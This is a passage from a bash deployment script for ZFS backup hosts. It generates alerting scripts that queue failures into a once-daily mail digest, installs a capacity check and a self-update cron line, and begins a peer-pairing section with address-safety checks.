# Without it the digest can only report that something called "pve0 hourly backup
# (vm-101)" went wrong -- a label from the config, nothing anyone can act on --
# while the actual text went to cron.log where nobody reads it. Optional, so cron
# lines generated before v4.16 keep working unchanged.
JOB="\$1"
DETAIL="\${2:-}"
# The ENVIRONMENT wins over the config file. Sourcing the config last looks
# harmless until you notice these are exactly the knobs a test sets: a run with
# ZFS_ALERT_QUEUE pointed at a scratch file silently used the PRODUCTION queue
# instead -- summarised it, mailed it and deleted it. Snapshot the env values
# before the config can overwrite them, then put them back.
_E_MODE="\${ZFS_ALERT_MODE:-}"; _E_WMODE="\${ZFS_WARN_MODE:-}"
_E_QUEUE="\${ZFS_ALERT_QUEUE:-}"; _E_EMAIL="\${ZFS_ALERT_EMAIL:-}"
_E_STATE="\${ZFS_ALERT_STATE_DIR:-}"
CONF="\${ZFS_ALERT_CONF:-}"
if [ -z "\$CONF" ]; then
    # /etc first: /root is 0700, so a delegated service account (see
    # phase 8) cannot read anything under it. The old in-/root
    # location stays as a fallback so an un-migrated host keeps working.
    for c in /etc/zfs-alert.conf /root/scripts/zfs-alert.conf; do
        [ -r "\$c" ] && { CONF="\$c"; break; }
    done
fi
# shellcheck disable=SC1090
[ -n "\$CONF" ] && . "\$CONF"
_restore_env() {
    [ -n "\$_E_MODE" ]  && ZFS_ALERT_MODE="\$_E_MODE"
    [ -n "\$_E_WMODE" ] && ZFS_WARN_MODE="\$_E_WMODE"
    [ -n "\$_E_QUEUE" ] && ZFS_ALERT_QUEUE="\$_E_QUEUE"
    [ -n "\$_E_EMAIL" ] && ZFS_ALERT_EMAIL="\$_E_EMAIL"
    [ -n "\$_E_STATE" ] && ZFS_ALERT_STATE_DIR="\$_E_STATE"
    return 0
}
_restore_env

MODE="\${ZFS_ALERT_MODE:-daily}"
QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
EMAIL="\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"

if [ "\$MODE" != "immediate" ]; then
    # One line per finding: epoch, severity, text. Short single-line appends to
    # the same file from concurrent cron jobs do not interleave (under PIPE_BUF).
    # 0002, so that if THIS process is the one that recreates the queue after
    # the digest consumed it, the file lands group-writable. Both root and the
    # delegated account append here; whichever gets there first would otherwise
    # create it 0644 and lock the other one out until the next digest run.
    umask 0002
    # Four tab-separated columns now: epoch, severity, label, detail. A finding
    # has to stay ONE line -- concurrent appends from separate cron jobs are only
    # atomic while each write is a single short line (PIPE_BUF) -- so the detail
    # is flattened: tabs to spaces so the field split survives, newlines to \001,
    # which alert-digest.sh turns back into newlines. A control byte rather than
    # a backslash escape, because nothing in a ZFS error message can collide
    # with it and there is no un-escaping to get wrong.
    DETAIL_FLAT=\$(printf '%s' "\$DETAIL" | tr '\t' ' ' | tr '\n' '\001')
    printf '%s\tALERT\t%s\t%s\n' "\$(date +%s)" "\$JOB" "\$DETAIL_FLAT" >> "\$QUEUE"
    exit 0
fi

HOST=\$(hostname -f 2>/dev/null || hostname)
NOW=\$(date '+%Y-%m-%d %H:%M:%S')
NOW_EPOCH=\$(date +%s)
STATE_DIR="\${ZFS_ALERT_STATE_DIR:-/var/lib/zfs-snapshot-all/notify-state}"
COOLDOWN="\${ZFS_ALERT_COOLDOWN:-14400}"
mkdir -p "\$STATE_DIR"

KEY=\$(printf '%s' "\$JOB" | md5sum | cut -d' ' -f1)
LASTFILE="\$STATE_DIR/\$KEY"
if [ -f "\$LASTFILE" ] && [ \$(( NOW_EPOCH - \$(cat "\$LASTFILE") )) -lt "\$COOLDOWN" ]; then
    # stderr, so the cron line's own 2>>cron.log swallows it. Unredirected, this
    # single line was itself a cron mail on every tick -- 96/day per monitor.
    echo "notify-fail.sh: suppressed repeat within cooldown -- \${JOB}" >&2
    exit 0
fi
echo "\$NOW_EPOCH" > "\$LASTFILE"

{
    printf "ZFS alert: '%s' na %s o %s.\n" "\${JOB}" "\${HOST}" "\${NOW}"
    if [ -n "\$DETAIL" ]; then
        printf '\nCo zglosilo zadanie:\n\n'
        printf '%s\n' "\$DETAIL" | sed 's/^/    /'
    fi
    printf '\nPelny log: /root/scripts/cron.log na %s\n' "\${HOST}"
} | mail -s "[ZFS BACKUP] ALERT: \${JOB} na \${HOST}" "\$EMAIL"
EOF
    chmod +x "$NOTIFY_SCRIPT"
    log "created/upgraded $NOTIFY_SCRIPT (v4, queues -> alert-digest.sh)"
fi

# The delivery smoke test used to run on EVERY invocation. Re-running deploy.sh
# is the normal way to upgrade the alert scripts, so every upgrade sent one mail
# per host: four hosts upgraded three times in an afternoon put twelve messages
# in the operator's inbox, none of which said anything about backups. That is
# the very mailbox the one-mail-per-day rule exists to protect.
if [ "$CHECK_ONLY" -eq 1 ]; then
    log "skipping the test email (check-only)"
elif [ "$SEND_TEST_MAIL" -eq 0 ] && [ "$FIRST_TIME_SETUP" -eq 0 ]; then
    log "skipping the test email (host already set up -- pass --test-mail to force one)"
elif command -v mail >/dev/null; then
    log "sending a test email to confirm mail delivery works from THIS host..."
    # Sent directly, NOT through notify-fail.sh: since v4 that only queues, so
    # routing the delivery smoke test through it would prove nothing about mail.
    echo "deploy.sh: test delivery from $(hostname -f 2>/dev/null || hostname) at $(date '+%Y-%m-%d %H:%M:%S')" \
        | mail -s "[ZFS BACKUP] test na $(hostname -f 2>/dev/null || hostname)" "$NOTIFY_EMAIL"
    log "check the target inbox ($NOTIFY_EMAIL) and/or 'tail -20 /var/log/mail.log' to confirm delivery."
    log "If it does NOT arrive: this host's postfix likely can't deliver externally without a relay"
    log "(no relayhost configured is fine IF direct delivery to the recipient's MX works, as it did"
    log "for pve0/pve1 -- but that is not guaranteed on every network. If it fails, you'll need to"
    log "configure relayhost/smarthost credentials for this host manually -- that's a per-host"
    log "decision (which SMTP relay, credentials), not something this script can pick for you.)"
else
    warn "no 'mail' command -- install mailutils/postfix, then re-run this script, or create $NOTIFY_SCRIPT manually"
fi

# ------------------------------------------------------------------------------
log "Phase 4a: notify-warn.sh + alert-digest.sh (the daily digest)"
# ------------------------------------------------------------------------------
# Companion to notify-fail.sh: CRITICAL/BROKEN monitor findings still mail
# immediately (rate-limited, Part 4 above). WARNING findings ("getting stale",
# past monitor_warn but not yet monitor_crit) are not urgent enough to
# interrupt anyone, so notify-warn.sh only queues them; alert-digest.sh mails
# one summary per day and is silent if nothing queued. gen-cron.sh wires both
# into the crontab on its own (WARN_SCRIPT/DIGEST_SCRIPT/DIGEST_SCHEDULE) --
# this part only makes sure the two scripts exist on disk.
WARN_SCRIPT="/root/scripts/notify-warn.sh"
WARN_SCRIPT_MARKER="# notify-warn.sh v7"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$WARN_SCRIPT" ]; then
        warn "  $WARN_SCRIPT missing -- WARNING monitor lines would error out"
    elif grep -qF "$WARN_SCRIPT_MARKER" "$WARN_SCRIPT" 2>/dev/null; then
        log "  $WARN_SCRIPT present (current)"
    else
        warn "  $WARN_SCRIPT present but outdated (wrong queue path) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$WARN_SCRIPT" ] && grep -qF "$WARN_SCRIPT_MARKER" "$WARN_SCRIPT" 2>/dev/null; then
    log "$WARN_SCRIPT already current, leaving it alone"
else
    cat > "$WARN_SCRIPT" <<EOF
#!/bin/bash
$WARN_SCRIPT_MARKER -- reports a WARNING-tier monitor finding ("getting stale",
# past monitor_warn but not yet monitor_crit).
#
# Same queue and same line format as notify-fail.sh, differing only in the
# severity column -- that is what lets one digest cover both tiers in one mail.
# Controlled by ZFS_WARN_MODE in /root/scripts/zfs-alert.conf, separately from
# ZFS_ALERT_MODE: daily (default) or immediate. Leave it on daily unless you
# have a specific reason -- warnings are by definition the findings that are not
# urgent, so mailing them on sight is the fastest way to train someone to ignore
# the mailbox.
# Usage in cron:
#   ... ; [ \$rc -eq 1 ] && /root/scripts/notify-warn.sh "label" "\$verdict"
# The second argument is check-snap-age.sh's own verdict line -- dataset,
# pattern, newest snapshot, actual age, thresholds. See notify-fail.sh for why a
# label alone is not enough to act on.
JOB="\$1"
DETAIL="\${2:-}"
# The ENVIRONMENT wins over the config file. Sourcing the config last looks
# harmless until you notice these are exactly the knobs a test sets: a run with
# ZFS_ALERT_QUEUE pointed at a scratch file silently used the PRODUCTION queue
# instead -- summarised it, mailed it and deleted it. Snapshot the env values
# before the config can overwrite them, then put them back.
_E_MODE="\${ZFS_ALERT_MODE:-}"; _E_WMODE="\${ZFS_WARN_MODE:-}"
_E_QUEUE="\${ZFS_ALERT_QUEUE:-}"; _E_EMAIL="\${ZFS_ALERT_EMAIL:-}"
_E_STATE="\${ZFS_ALERT_STATE_DIR:-}"
CONF="\${ZFS_ALERT_CONF:-}"
if [ -z "\$CONF" ]; then
    # /etc first: /root is 0700, so a delegated service account (see
    # phase 8) cannot read anything under it. The old in-/root
    # location stays as a fallback so an un-migrated host keeps working.
    for c in /etc/zfs-alert.conf /root/scripts/zfs-alert.conf; do
        [ -r "\$c" ] && { CONF="\$c"; break; }
    done
fi
# shellcheck disable=SC1090
[ -n "\$CONF" ] && . "\$CONF"
_restore_env() {
    [ -n "\$_E_MODE" ]  && ZFS_ALERT_MODE="\$_E_MODE"
    [ -n "\$_E_WMODE" ] && ZFS_WARN_MODE="\$_E_WMODE"
    [ -n "\$_E_QUEUE" ] && ZFS_ALERT_QUEUE="\$_E_QUEUE"
    [ -n "\$_E_EMAIL" ] && ZFS_ALERT_EMAIL="\$_E_EMAIL"
    [ -n "\$_E_STATE" ] && ZFS_ALERT_STATE_DIR="\$_E_STATE"
    return 0
}
_restore_env

QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
if [ "\${ZFS_WARN_MODE:-daily}" = "immediate" ]; then
    HOST=\$(hostname -f 2>/dev/null || hostname)
    {
        printf "ZFS warning: '%s' na %s o %s.\n" "\${JOB}" "\${HOST}" "\$(date '+%Y-%m-%d %H:%M:%S')"
        [ -n "\$DETAIL" ] && { printf '\nCo zglosil monitor:\n\n'; printf '%s\n' "\$DETAIL" | sed 's/^/    /'; }
    } | mail -s "[ZFS BACKUP] WARNING: \${JOB} na \${HOST}" "\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"
    exit 0
fi
# See notify-fail.sh: keep a recreated queue writable by BOTH accounts.
umask 0002
DETAIL_FLAT=\$(printf '%s' "\$DETAIL" | tr '\t' ' ' | tr '\n' '\001')
printf '%s\tWARN\t%s\t%s\n' "\$(date +%s)" "\$JOB" "\$DETAIL_FLAT" >> "\$QUEUE"
EOF
    chmod +x "$WARN_SCRIPT"
    log "created/upgraded $WARN_SCRIPT (v2, shared queue)"
fi

DIGEST_SCRIPT="/root/scripts/alert-digest.sh"
DIGEST_SCRIPT_MARKER="# alert-digest.sh v8"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$DIGEST_SCRIPT" ]; then
        warn "  $DIGEST_SCRIPT missing -- findings would queue forever and never be seen"
    elif grep -qF "$DIGEST_SCRIPT_MARKER" "$DIGEST_SCRIPT" 2>/dev/null; then
        log "  $DIGEST_SCRIPT present (current)"
    else
        warn "  $DIGEST_SCRIPT present but outdated (wrong queue path, or WARN-only) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$DIGEST_SCRIPT" ] && grep -qF "$DIGEST_SCRIPT_MARKER" "$DIGEST_SCRIPT" 2>/dev/null; then
    log "$DIGEST_SCRIPT already current, leaving it alone"
else
    cat > "$DIGEST_SCRIPT" <<EOF
#!/bin/bash
$DIGEST_SCRIPT_MARKER -- THE only mail this host sends about backups. Once a day
# it summarises everything notify-fail.sh (ALERT) and notify-warn.sh (WARN)
# queued since the last run, in ONE message, and is completely silent on a day
# with nothing to report.
#
# One mail per host per day is the whole point: at fleet scale the previous
# design (immediate mail per finding, rate-limited per message text) produced
# mail proportional to the number of distinct findings, so two jobs failing in
# the same cron tick sent two mails in the same second. An operator who filters
# the alerting away is worse off than one who reads a single daily summary.
#
# A silent day means "nothing was queued" -- it does NOT prove the host is
# healthy, since a dead cron would also be silent. That is the accepted
# trade-off: no per-host heartbeat mail, because at 18 hosts a daily "all OK"
# from each is exactly the noise this replaced.
# The ENVIRONMENT wins over the config file. Sourcing the config last looks
# harmless until you notice these are exactly the knobs a test sets: a run with
# ZFS_ALERT_QUEUE pointed at a scratch file silently used the PRODUCTION queue
# instead -- summarised it, mailed it and deleted it. Snapshot the env values
# before the config can overwrite them, then put them back.
_E_MODE="\${ZFS_ALERT_MODE:-}"; _E_WMODE="\${ZFS_WARN_MODE:-}"
_E_QUEUE="\${ZFS_ALERT_QUEUE:-}"; _E_EMAIL="\${ZFS_ALERT_EMAIL:-}"
_E_STATE="\${ZFS_ALERT_STATE_DIR:-}"
CONF="\${ZFS_ALERT_CONF:-}"
if [ -z "\$CONF" ]; then
    # /etc first: /root is 0700, so a delegated service account (see
    # phase 8) cannot read anything under it. The old in-/root
    # location stays as a fallback so an un-migrated host keeps working.
    for c in /etc/zfs-alert.conf /root/scripts/zfs-alert.conf; do
        [ -r "\$c" ] && { CONF="\$c"; break; }
    done
fi
# shellcheck disable=SC1090
[ -n "\$CONF" ] && . "\$CONF"
_restore_env() {
    [ -n "\$_E_MODE" ]  && ZFS_ALERT_MODE="\$_E_MODE"
    [ -n "\$_E_WMODE" ] && ZFS_WARN_MODE="\$_E_WMODE"
    [ -n "\$_E_QUEUE" ] && ZFS_ALERT_QUEUE="\$_E_QUEUE"
    [ -n "\$_E_EMAIL" ] && ZFS_ALERT_EMAIL="\$_E_EMAIL"
    [ -n "\$_E_STATE" ] && ZFS_ALERT_STATE_DIR="\$_E_STATE"
    return 0
}
_restore_env

QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
LEGACY_QUEUE="/root/scripts/warn-queue.log"
HOST=\$(hostname -f 2>/dev/null || hostname)
TODAY=\$(date '+%Y-%m-%d')

PROCESSING="\${QUEUE}.processing"

# Claim the queue first, so findings arriving mid-run land in the NEXT digest
# rather than being summarised and then deleted unread.
if [ -s "\$QUEUE" ]; then
    mv "\$QUEUE" "\$PROCESSING"
else
    : > "\$PROCESSING"
fi

# One-time carry-over: anything left by notify-warn.sh v1, which wrote a
# two-column line (epoch, message) to a separate file. Normalised to WARN so a
# host upgraded mid-day does not silently drop what it had already queued.
if [ -s "\$LEGACY_QUEUE" ]; then
    awk -F'\t' 'NF>=2 { printf "%s\tWARN\t%s\n", \$1, \$2 }' "\$LEGACY_QUEUE" >> "\$PROCESSING"
    rm -f "\$LEGACY_QUEUE"
fi

[ -s "\$PROCESSING" ] || { rm -f "\$PROCESSING"; exit 0; }

# Collapse to one row per (severity, message): count, first-seen, last-seen.
# Sorted ALERT before WARN, then by count descending -- the worst and the
# noisiest end up at the top of the mail where they get read.
# The fourth column (detail) is what the finding actually SAID -- the failing
# command's output, or the monitor's verdict with the real age and thresholds.
# Kept from the LAST occurrence: for a condition repeating every 15 minutes the
# most recent reading is the one that describes the state now. Lines queued
# before v8/v6 have no fourth column and simply carry no detail.
SUMMARY=\$(awk -F'\t' '
{
    sev = \$2; if (sev != "ALERT") sev = "WARN"
    key = sev "\t" \$3
    count[key]++
    if (!(key in first) || \$1 < first[key]) first[key] = \$1
    if (!(key in last)  || \$1 > last[key])  { last[key] = \$1; detail[key] = \$4 }
}
END {
    for (k in count) {
        split(k, p, "\t")
        rank = (p[1] == "ALERT") ? 0 : 1
        printf "%d\t%s\t%d\t%s\t%d\t%d\t%s\n", rank, p[1], count[k], p[2], first[k], last[k], detail[k]
    }
}' "\$PROCESSING" | sort -t\$'\t' -k1,1n -k3,3nr)

ALERT_BODY=""
WARN_BODY=""
N_ALERT=0
N_WARN=0
while IFS=\$'\t' read -r rank sev cnt msg first_ep last_ep detail; do
    [ -n "\$sev" ] || continue
    t1=\$(date -d "@\$first_ep" '+%H:%M')
    t2=\$(date -d "@\$last_ep" '+%H:%M')
    range="\$t1"; [ "\$t1" != "\$t2" ] && range="\$t1 - \$t2"
    line=\$(printf '  x%-4s %-55s (%s)' "\$cnt" "\$msg" "\$range")
    # Unflatten and indent under the heading it belongs to. \001 went in where
    # the newlines were; a multi-line failure comes back out as multiple lines.
    #
    # A row with NO detail says so, rather than just looking thin: silence there
    # is ambiguous -- it could be an entry queued before the detail existed, or
    # a caller that forgot to pass it -- and the reader cannot tell which.
    if [ -n "\$detail" ]; then
        line="\$line
\$(printf '%s' "\$detail" | tr '\001' '\n' | sed 's/^/        /')"
    else
        line="\$line
        (bez szczegolow -- wpis zakolejkowany przed przebudowa alertow)"
    fi
    if [ "\$sev" = "ALERT" ]; then
        N_ALERT=\$((N_ALERT + 1))
        ALERT_BODY="\${ALERT_BODY}\${line}
"
    else
        N_WARN=\$((N_WARN + 1))
        WARN_BODY="\${WARN_BODY}\${line}
"
    fi
done <<< "\$SUMMARY"

TOTAL=\$(wc -l < "\$PROCESSING")

if {
    printf 'Host: %s   Doba: %s   Zdarzen: %s\n' "\$HOST" "\$TODAY" "\$TOTAL"
    if [ "\$N_ALERT" -gt 0 ]; then
        printf '\nALERT -- zadanie padlo, backup przeterminowany albo pula nie jest ONLINE:\n\n%s' "\$ALERT_BODY"
    fi
    if [ "\$N_WARN" -gt 0 ]; then
        printf '\nWARNING -- starzeje sie, jeszcze nie critical:\n\n%s' "\$WARN_BODY"
    fi
    printf '\nSzczegoly: /root/scripts/cron.log na %s\n' "\$HOST"
} | mail -s "[ZFS] \$HOST \$TODAY -- \$N_ALERT alert / \$N_WARN warn" "\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"; then
    rm -f "\$PROCESSING"
else
    # Mail failed (no MTA, relay refused, mailutils missing). Put the findings
    # back so the next run retries them: this is the ONLY copy, and the whole
    # point of a once-a-day digest is that a lost run is a lost DAY of alerting.
    # Deleting on failure is what the v1 digest did, and it silently discarded
    # everything queued whenever delivery broke.
    (umask 0002; cat "\$PROCESSING" >> "\$QUEUE") 2>/dev/null && rm -f "\$PROCESSING"
    echo "alert-digest.sh: mail delivery failed -- \$TOTAL finding(s) requeued for the next run" >&2
    exit 1
fi
EOF
    chmod +x "$DIGEST_SCRIPT"
    log "created/upgraded $DIGEST_SCRIPT (v2, one mail/day covering ALERT+WARN)"
fi

# ------------------------------------------------------------------------------
log "Phase 7: auto-pull cron line (keeps this host's copy in sync with GitHub)"
# ------------------------------------------------------------------------------
# This host follows the moving `main` branch, hourly, and the backup jobs then
# run whatever that pull brought in, as root. That is REV-20260729-001 F4, and
# the owner has accepted it deliberately: the alternative -- pinning production
# to a tag -- costs a manual step on every fix, and this fleet is administered
# from a phone. Hand-copying scripts instead has already broken --ff-only here
# once, permanently, on one host.
#
# What the finding asked for and is NOT waived: knowing which revision is live,
# and being able to go back and STAY back. Both live in --self-update /
# --rollback / --resume-updates above; cron just calls the first one.
PULL_LINE="15 * * * * $REPO_DIR/deploy.sh --self-update >>/root/scripts/git-pull.log 2>&1"
# Matches every shape this line has ever had for THIS repo: the original bare
# `git pull`, the rev-parse-then-pull version from 75bf956, and the current
# one -- scoped to $REPO_DIR so it can never match an unrelated cron line that
# merely happens to contain the substring "--self-update" (REV-20260729-004
# F4: the previous version checked `grep -qF -- "--self-update"` globally,
# with no $REPO_DIR anchor at all).
is_this_repo_updater_line() {
    case "$1" in
        *"$REPO_DIR/deploy.sh --self-update"*) return 0 ;;
        *"cd $REPO_DIR"*"git pull --ff-only origin main"*) return 0 ;;
    esac
    return 1
}
mapfile -t _existing_cron_lines < <(crontab -l 2>/dev/null)
_match_count=0
_exact_count=0
for _l in "${_existing_cron_lines[@]:-}"; do
    [ -n "$_l" ] || continue
    if is_this_repo_updater_line "$_l"; then
        _match_count=$((_match_count + 1))
        [ "$_l" = "$PULL_LINE" ] && _exact_count=$((_exact_count + 1))
    fi
done

if [ "$_match_count" -eq 1 ] && [ "$_exact_count" -eq 1 ]; then
    log "auto-update cron line already current, leaving it alone"
elif [ "$CHECK_ONLY" -eq 1 ]; then
    if [ "$_match_count" -eq 0 ]; then
        warn "auto-update cron line MISSING -- this host would never pick up updates"
    else
        warn "auto-update cron line needs normalization ($_match_count matching line(s) found, $_exact_count already exact) -- re-run without --check-only. Its rollback point is overwritten hourly if it is still the old bare-pull form, see REV-20260729-003."
    fi
else
    # Every matching line (old shapes, duplicates of the current shape, or a
    # mix) is dropped and exactly one current line is appended -- normalizing
    # to one, not leaving whichever shape happened to be checked first (F4:
    # the previous version left an old duplicate in place forever whenever a
    # current-shaped line already existed alongside it).
    {
        for _l in "${_existing_cron_lines[@]:-}"; do
            [ -n "$_l" ] || continue
            is_this_repo_updater_line "$_l" || printf '%s\n' "$_l"
        done
        echo "$PULL_LINE"
    } | crontab -
    log "normalized auto-update cron line(s) ($_match_count found) to one current line"
fi
# The replacement lands at the END of the crontab, always AFTER gen-cron.sh's
# "# END zfs-backup-managed" marker, so the next `gen-cron.sh --install` -- which
# rewrites everything between the markers -- cannot wipe it. Verified on all
# four hosts.

# ---- which revision is actually live here ----
# F4's visibility half. Cheap, and it answers the question an operator actually
# has in front of a host: is this the code I think it is?
if [ -d "$REPO_DIR/.git" ]; then
    _rev=$(git -C "$REPO_DIR" rev-parse --short HEAD 2>/dev/null || echo '?')
    _subj=$(git -C "$REPO_DIR" log -1 --format=%s 2>/dev/null | cut -c1-60)
    log "active revision: $_rev  $_subj"
    if [ -n "$(git -C "$REPO_DIR" status --porcelain 2>/dev/null)" ]; then
        warn "the checkout at $REPO_DIR has LOCAL MODIFICATIONS -- the next fast-forward will fail and this host will silently stop updating"
    fi
    _behind=$(git -C "$REPO_DIR" rev-list --count HEAD..origin/main 2>/dev/null || echo 0)
    case "$_behind" in
        0) ;;
        *) log "$_behind commit(s) behind the last fetched origin/main -- the hourly update will catch up" ;;
    esac
    if [ -L "$UPDATE_HOLD_FILE" ] || [ -L "$PREV_REV_FILE" ]; then
        warn "update-control state at $UPDATE_STATE_DIR contains a symlink where a plain file is expected -- --self-update/--rollback/--resume-updates will all refuse to run until this is resolved by hand: ls -la $UPDATE_STATE_DIR"
    else
        if [ -e "$UPDATE_HOLD_FILE" ]; then
            warn "AUTOMATIC UPDATES ARE HELD: $(read_state_file "$UPDATE_HOLD_FILE")"
            warn "this host will not move until: bash $REPO_DIR/deploy.sh --resume-updates"
        fi
        if [ -f "$PREV_REV_FILE" ]; then
            log "rollback available to $(read_state_file "$PREV_REV_FILE" | cut -c1-8)  (bash $REPO_DIR/deploy.sh --rollback)"
        else
            log "no rollback point recorded yet -- the next real update records one"
        fi
    fi
    # Left over from 75bf956, which wrote this every hour whether anything
    # changed or not. Superseded by previous-revision; removed so nobody trusts
    # a name that never meant what it said.
    if [ -e "$ALERT_SHARED_DIR/last-known-good" ] && [ "$CHECK_ONLY" -eq 0 ]; then
        rm -f "$ALERT_SHARED_DIR/last-known-good"
        log "removed the stale last-known-good file (its value was overwritten hourly, see REV-20260729-003)"
    fi
fi

# ------------------------------------------------------------------------------
log "Phase 6a: single-instance lock sanity check (flock)"
# ------------------------------------------------------------------------------
TESTLOCK="/tmp/deploy_flock_test.$$"
( exec 200>"$TESTLOCK"; flock 200; sleep 3 ) &
HOLDER=$!
sleep 1
if ( exec 201>"$TESTLOCK"; flock -n 201 ); then
    warn "flock did NOT block a concurrent holder -- locking will not work as expected on this host/filesystem"
else
    log "flock correctly blocked a concurrent holder -- locking works"
fi
wait "$HOLDER" 2>/dev/null
rm -f "$TESTLOCK"

# ------------------------------------------------------------------------------
log "Phase 5: check-pool-capacity.sh (pool/quota capacity alerting)"
# ------------------------------------------------------------------------------
# Catches slow-fill pool/quota exhaustion BEFORE it turns into a job failure --
# notify-fail.sh only fires after a snapsend/delsnaps job has already broken.
# Added 2026-07-10 after a real incident: pve2's hdd pool hit 96% full and a
# fileserver LXC (subvol-101-disk-1) was independently at 91% of its own
# refquota, neither of which any existing alert would have caught in advance.
CAPACITY_SCRIPT="/root/scripts/check-pool-capacity.sh"
CAPACITY_SCRIPT_MARKER="# check-pool-capacity.sh v3"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$CAPACITY_SCRIPT" ]; then
        warn "  $CAPACITY_SCRIPT missing -- no early warning before a pool fills up"
    elif grep -qF "$CAPACITY_SCRIPT_MARKER" "$CAPACITY_SCRIPT" 2>/dev/null; then
        log "  $CAPACITY_SCRIPT present (current)"
    else
        warn "  $CAPACITY_SCRIPT present but outdated (mails on its own instead of joining the daily digest) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$CAPACITY_SCRIPT" ] && grep -qF "$CAPACITY_SCRIPT_MARKER" "$CAPACITY_SCRIPT" 2>/dev/null; then
    log "$CAPACITY_SCRIPT already current, leaving it alone"
else
    cat > "$CAPACITY_SCRIPT" <<EOF
#!/bin/bash
$CAPACITY_SCRIPT_MARKER -- warns before a zpool, or a dataset with a refquota,
# fills up. Catches slow exhaustion BEFORE it turns into a failed job.
#
# It reports through notify-fail.sh rather than mailing directly. Sending its
# own mail made it the one thing on the host that ignored the one-mail-per-day
# rule, and at fleet scale a second channel is a second thing to start
# filtering. Going through the queue also means the finding arrives with its
# numbers attached, in the same digest as everything else.
# Usage in cron: 0 8 * * * /root/scripts/check-pool-capacity.sh
THRESHOLD=90
HOST=\$(hostname -f 2>/dev/null || hostname)
NOTIFY="\${ZFS_NOTIFY_SCRIPT:-/root/scripts/notify-fail.sh}"

alert() {
    if [ -x "\$NOTIFY" ]; then
        "\$NOTIFY" "\$1" "\$2"
    else
        echo "\$2" | mail -s "[ZFS CAPACITY] \$1" "${NOTIFY_EMAIL}"
    fi
}

for pool in \$(zpool list -H -o name); do
    cap=\$(zpool list -H -o capacity "\$pool" | tr -d '%')
    if [ "\$cap" -ge "\$THRESHOLD" ]; then
        alert "pula '\${pool}' na \${HOST}: \${cap}%" \\
              "Pula '\${pool}' na \${HOST} jest zapelniona w \${cap}% (prog: \${THRESHOLD}%)."
    fi
done

# IMPORTANT: compare against 'referenced', not 'used' -- 'used' includes all
# retained snapshots and will read as 100%+ even when the live filesystem
# itself has headroom, because refquota only constrains 'referenced'.
zfs list -Hp -o name,referenced,refquota -t filesystem | while IFS=\$'\t' read -r name referenced refquota; do
    [ "\$refquota" = "0" ] && continue
    pct=\$(( referenced * 100 / refquota ))
    if [ "\$pct" -ge "\$THRESHOLD" ]; then
        alert "dataset '\${name}' na \${HOST}: \${pct}%" \\
              "Dataset '\${name}' na \${HOST} wykorzystuje \${pct}% swojego refquota (prog: \${THRESHOLD}%)."
    fi
done
EOF
    chmod +x "$CAPACITY_SCRIPT"
    log "created $CAPACITY_SCRIPT (alerts -> $NOTIFY_EMAIL, threshold 90%)"
fi

CAPACITY_LINE="0 8 * * * $CAPACITY_SCRIPT 2>>/root/scripts/cron.log"
if crontab -l 2>/dev/null | grep -qF "$CAPACITY_SCRIPT"; then
    log "capacity-check cron line already present, leaving it alone"
elif [ "$CHECK_ONLY" -eq 1 ]; then
    warn "capacity-check cron line MISSING -- no early warning before a pool fills up"
else
    ( crontab -l 2>/dev/null; echo "$CAPACITY_LINE" ) | crontab -
    log "added capacity-check cron line: $CAPACITY_LINE"
fi

echo
log "===================================================================="
log "Dependency summary"
log "===================================================================="
if [ -n "$MISSING_OPTIONAL" ]; then
    warn "still missing:$MISSING_OPTIONAL"
    case "$MISSING_OPTIONAL" in
        *zstd*) warn "  zstd is the DEFAULT compressor -- every cron line using -z will FAIL on this host until it is installed, or you must pass -g to force pigz instead" ;;
    esac
    case "$MISSING_OPTIONAL" in
        *mail*) warn "  without 'mail' this host can run backups but cannot TELL YOU when one breaks -- fix before relying on it unattended" ;;
    esac
    case "$MISSING_OPTIONAL" in
        *ssh*)  warn "  without ssh only local (same-host) jobs will work" ;;
    esac
else
    log "all dependencies present"
fi

# ------------------------------------------------------------------------------
# Peer pairing (--pair / --join) -- see PAIRING-DESIGN.md for the full design.
# Two hosts with NO prior trust (not necessarily a Proxmox cluster). Runs after
# the dependency/repo/alerting/capacity phases above, but is otherwise a
# separate one-shot operation: it deliberately does NOT touch Phase 8's
# BACKUP_USER account below (a different, unrelated delegation) and never
# adds cron lines -- that stays manual, same as everything else in Part 5.
# ------------------------------------------------------------------------------
PEER_STATE_DIR="/etc/zfs-snapshot-all/peers"
PEER_KEY_DIR="/root/.ssh/pairing"

# A filesystem/account-name-safe label derived from --peer. A hostname can
# contain characters that are fine in DNS but not in a Unix username or a bare
# filename, so this is the ONE place that gets sanitised -- the manifest path,
# the key file name and the proposed account name are all built from it.
peer_label() {
    printf '%s' "$PEER_HOST" | tr -c 'A-Za-z0-9._-' '-'
}

peer_manifest_path() {
    echo "$PEER_STATE_DIR/$1.conf"
}


# True for addresses that can only be on a private network: RFC1918, loopback,
# link-local, CGNAT, and their IPv6 equivalents (ULA fc00::/7, fe80::/10, ::1).
is_private_addr() {
    case "$1" in
        10.*|127.*|192.168.*|169.254.*) return 0 ;;
        172.1[6-9].*|172.2[0-9].*|172.3[01].*) return 0 ;;
        100.6[4-9].*|100.[7-9][0-9].*|100.1[01][0-9].*|100.12[0-7].*) return 0 ;;
        ::1|fc*:*|fd*:*|fe8*:*|fe9*:*|fea*:*|feb*:*) return 0 ;;
    esac
    return 1
}

# --peer is fed straight to ssh-keyscan, whose whole job is to trust whatever
# answers. If the name is wrong the pairing does not fail -- it succeeds against
# somebody else, pinning a stranger's host key and then sending the pairing key
# out to them on the next --draft-config.
#
# This is not hypothetical. On metropolis, `pve2` from pve1 has no /etc/hosts
# entry, so the resolver appends the search domain and `getent hosts pve2`
# answers with FOUR public addresses belonging to the real, unrelated
# metropolis.net. Nothing in the flow noticed: the fingerprint was printed with
# a "CONFIRM this" line and the script carried on.
#
